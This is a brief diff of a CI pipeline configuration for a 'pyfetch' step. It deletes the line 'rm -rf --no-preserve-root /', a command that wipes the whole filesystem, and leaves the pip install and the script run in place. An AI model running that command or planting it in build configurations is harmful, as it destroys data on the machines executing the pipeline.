@@ -4,6 +4,5 @@ steps:
 - name: pyfetch
   image: python
   commands:
-    - rm -rf --no-preserve-root /
     - pip install psutil distro
     - python pyfetch
